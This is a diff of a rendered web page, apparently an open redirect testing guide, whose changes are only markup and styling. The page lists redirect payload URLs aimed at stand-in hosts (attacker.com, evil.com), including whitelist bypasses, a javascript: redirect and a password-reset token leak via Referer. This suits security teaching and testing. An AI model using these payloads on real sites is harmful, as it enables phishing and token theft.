-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Whitelist</span> <span style="color:#a6e22e">check</span> <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;trusted.com&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Whitelist</span> <span style="color:#a6e22e">check</span> <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;trusted.com&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com.attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com@attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com.evil.com
-</span></span></span></code></pre></div><h3 id="7-path-based-redirects">
-  7. Path-Based Redirects
-  <a class="anchor" href="#7-path-based-redirects">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com@attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https://trusted.com.evil.com</span></span></span></code></pre></div><h3 id="7-path-based-redirects">7. Path-Based Redirects<a class="anchor" href="#7-path-based-redirects">#</a></h3>
 <ul>
 <li>Application only validates domain, ignores path</li>
 <li>Attacker uses open redirect on whitelisted domain</li>
@@ -1425,19 +1389,12 @@ https://github.com/alex-shpak/hugo-book
 <li>Bypasses strict domain validation</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Site</span> <span style="color:#a6e22e">validates</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">domain</span> <span style="color:#a6e22e">is</span> <span style="color:#e6db74">&#34;partner.com&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Site</span> <span style="color:#a6e22e">validates</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">domain</span> <span style="color:#a6e22e">is</span> <span style="color:#e6db74">&#34;partner.com&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://partner.com/redirect?next=https://attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">User</span> <span style="color:#a6e22e">redirected</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">com</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#a6e22e">partner</span>.<span style="color:#a6e22e">com</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span>
-</span></span></code></pre></div><hr>
-<h2 id="attack-surfaces">
-  Attack Surfaces
-  <a class="anchor" href="#attack-surfaces">#</a>
-</h2>
-<h3 id="loginlogout-flows">
-  Login/Logout Flows
-  <a class="anchor" href="#loginlogout-flows">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">User</span> <span style="color:#a6e22e">redirected</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">com</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#a6e22e">partner</span>.<span style="color:#a6e22e">com</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span></span></span></code></pre></div><hr>
+<h2 id="attack-surfaces">Attack Surfaces<a class="anchor" href="#attack-surfaces">#</a></h2>
+<h3 id="loginlogout-flows">Login/Logout Flows<a class="anchor" href="#loginlogout-flows">#</a></h3>
 <p>Applications commonly redirect users after authentication or logout.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1447,17 +1404,13 @@ https://github.com/alex-shpak/hugo-book
 <li>Multi-step authentication with continuation URLs</li>
 </ul>
 <p><strong>Testing approach:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">login</span> <span style="color:#a6e22e">redirect</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">login</span> <span style="color:#a6e22e">redirect</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login?next=https://evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login?redirect=//evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login?continue=javascript:alert(1)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login?redirect=//evil.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login?continue=javascript:alert(1)
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">logout</span> <span style="color:#a6e22e">redirect</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/logout?return_to=https://attacker.com
-</span></span></span></code></pre></div><h3 id="oauthsso-callback-urls">
-  OAuth/SSO Callback URLs
-  <a class="anchor" href="#oauthsso-callback-urls">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//target.com/logout?return_to=https://attacker.com</span></span></span></code></pre></div><h3 id="oauthsso-callback-urls">OAuth/SSO Callback URLs<a class="anchor" href="#oauthsso-callback-urls">#</a></h3>
 <p>OAuth and SAML implementations accept redirect_uri parameters.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1467,21 +1420,17 @@ https://github.com/alex-shpak/hugo-book
 <li>Open redirects on whitelisted callback URLs</li>
 </ul>
 <p><strong>Testing approach:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Manipulate</span> <span style="color:#a6e22e">redirect_uri</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Manipulate</span> <span style="color:#a6e22e">redirect_uri</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//oauth-provider.com/authorize?
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">app123</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">app123</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">redirect_uri</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Subdomain</span> <span style="color:#a6e22e">bypass</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">redirect_uri</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//evil.trusted-domain.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Path</span> <span style="color:#a6e22e">traversal</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">redirect_uri</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted.com/../../evil.com
-</span></span></span></code></pre></div><h3 id="password-resetemail-verification">
-  Password Reset/Email Verification
-  <a class="anchor" href="#password-resetemail-verification">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">redirect_uri</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//trusted.com/../../evil.com</span></span></span></code></pre></div><h3 id="password-resetemail-verification">Password Reset/Email Verification<a class="anchor" href="#password-resetemail-verification">#</a></h3>
 <p>Password reset emails often contain redirect parameters.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1491,18 +1440,14 @@ https://github.com/alex-shpak/hugo-book
 <li>Token leakage via Referer header</li>
 </ul>
 <p><strong>Testing approach:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Request</span> <span style="color:#a6e22e">password</span> <span style="color:#a6e22e">reset</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">malicious</span> <span style="color:#a6e22e">redirect</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Request</span> <span style="color:#a6e22e">password</span> <span style="color:#a6e22e">reset</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">malicious</span> <span style="color:#a6e22e">redirect</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password</span><span style="color:#f92672">-</span><span style="color:#a6e22e">reset</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">email</span><span style="color:#f92672">=</span><span style="color:#a6e22e">victim</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">com</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">redirect</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">clicks</span> <span style="color:#a6e22e">email</span> <span style="color:#a6e22e">link</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/reset?token=SECRET&amp;next=https://attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Token</span> <span style="color:#a6e22e">leaked</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">Referer</span> <span style="color:#a6e22e">header</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span>
-</span></span></code></pre></div><h3 id="languageregion-selectors">
-  Language/Region Selectors
-  <a class="anchor" href="#languageregion-selectors">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Token</span> <span style="color:#a6e22e">leaked</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">Referer</span> <span style="color:#a6e22e">header</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span></span></span></code></pre></div><h3 id="languageregion-selectors">Language/Region Selectors<a class="anchor" href="#languageregion-selectors">#</a></h3>
 <p>Multi-language sites often redirect based on locale preferences.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1512,12 +1457,8 @@ https://github.com/alex-shpak/hugo-book
 <li>Currency/timezone change handlers</li>
 </ul>
 <p><strong>Testing approach:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/set-language?lang=en&amp;return=https://evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/region?locale=us&amp;redirect=//attacker.com
-</span></span></span></code></pre></div><h3 id="downloadfile-handlers">
-  Download/File Handlers
-  <a class="anchor" href="#downloadfile-handlers">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/set-language?lang=en&amp;return=https://evil.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//site.com/region?locale=us&amp;redirect=//attacker.com</span></span></span></code></pre></div><h3 id="downloadfile-handlers">Download/File Handlers<a class="anchor" href="#downloadfile-handlers">#</a></h3>
 <p>File download endpoints that redirect to CDN or storage URLs.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1527,12 +1468,8 @@ https://github.com/alex-shpak/hugo-book
 <li>Media player source URL manipulation</li>
 </ul>
 <p><strong>Testing approach:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/download?file=https://evil.com/malware.exe
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/view-pdf?url=https://attacker.com/phishing.pdf
-</span></span></span></code></pre></div><h3 id="search-and-filter-results">
-  Search and Filter Results
-  <a class="anchor" href="#search-and-filter-results">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/download?file=https://evil.com/malware.exe
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//site.com/view-pdf?url=https://attacker.com/phishing.pdf</span></span></span></code></pre></div><h3 id="search-and-filter-results">Search and Filter Results<a class="anchor" href="#search-and-filter-results">#</a></h3>
 <p>Search result pages with redirect-on-click functionality.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1542,100 +1479,60 @@ https://github.com/alex-shpak/hugo-book
 <li>Ad click tracking endpoints</li>
 </ul>
 <p><strong>Testing approach:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/track-click?url=https://evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/go?link=https://attacker.com/phishing
-</span></span></span></code></pre></div><hr>
-<h2 id="exploitation-techniques">
-  Exploitation Techniques
-  <a class="anchor" href="#exploitation-techniques">#</a>
-</h2>
-<h3 id="basic-open-redirect-exploitation">
-  Basic Open Redirect Exploitation
-  <a class="anchor" href="#basic-open-redirect-exploitation">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/track-click?url=https://evil.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//site.com/go?link=https://attacker.com/phishing</span></span></span></code></pre></div><hr>
+<h2 id="exploitation-techniques">Exploitation Techniques<a class="anchor" href="#exploitation-techniques">#</a></h2>
+<h3 id="basic-open-redirect-exploitation">Basic Open Redirect Exploitation<a class="anchor" href="#basic-open-redirect-exploitation">#</a></h3>
 <p><strong>Standard URL Parameter:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/redirect?url=https://attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/login?next=https://evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/go?to=https://phishing-site.com
-</span></span></span></code></pre></div><p><strong>Protocol-Relative URLs:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/redirect?url=//attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/login?next=//evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Browser</span> <span style="color:#a6e22e">interprets</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com
-</span></span></span></code></pre></div><p><strong>Path-Relative Bypasses:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/redirect?url=/redirect?url=https://evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/login?next=/../../evil.com
-</span></span></span></code></pre></div><h3 id="whitelist-bypass-techniques">
-  Whitelist Bypass Techniques
-  <a class="anchor" href="#whitelist-bypass-techniques">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/redirect?url=https://attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/login?next=https://evil.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//trusted-site.com/go?to=https://phishing-site.com</span></span></span></code></pre></div><p><strong>Protocol-Relative URLs:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/redirect?url=//attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/login?next=//evil.com
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Browser</span> <span style="color:#a6e22e">interprets</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//attacker.com</span></span></span></code></pre></div><p><strong>Path-Relative Bypasses:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-site.com/redirect?url=/redirect?url=https://evil.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//trusted-site.com/login?next=/../../evil.com</span></span></span></code></pre></div><h3 id="whitelist-bypass-techniques">Whitelist Bypass Techniques<a class="anchor" href="#whitelist-bypass-techniques">#</a></h3>
 <p><strong>Subdomain Manipulation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">whitelist</span> <span style="color:#a6e22e">checks</span> <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;trusted.com&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">whitelist</span> <span style="color:#a6e22e">checks</span> <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;trusted.com&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com.attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://attacker.com.trusted.com (if attacker owns domain)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com@attacker.com
-</span></span></span></code></pre></div><p><strong>URL Parser Confusion:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Different</span> <span style="color:#a6e22e">parsers</span> <span style="color:#a6e22e">interpret</span> <span style="color:#a6e22e">URLs</span> <span style="color:#a6e22e">differently</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://attacker.com.trusted.com (if attacker owns domain)
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https://trusted.com@attacker.com</span></span></span></code></pre></div><p><strong>URL Parser Confusion:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Different</span> <span style="color:#a6e22e">parsers</span> <span style="color:#a6e22e">interpret</span> <span style="color:#a6e22e">URLs</span> <span style="color:#a6e22e">differently</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com:@attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com%2F@attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com%09@attacker.com
-</span></span></span></code></pre></div><p><strong>Path Traversal:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com/../../evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com/../../../../../evil.com
-</span></span></span></code></pre></div><p><strong>Null Byte Injection:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com%00.attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com%00@attacker.com
-</span></span></span></code></pre></div><p><strong>Backslash vs Forward Slash:</strong></p>
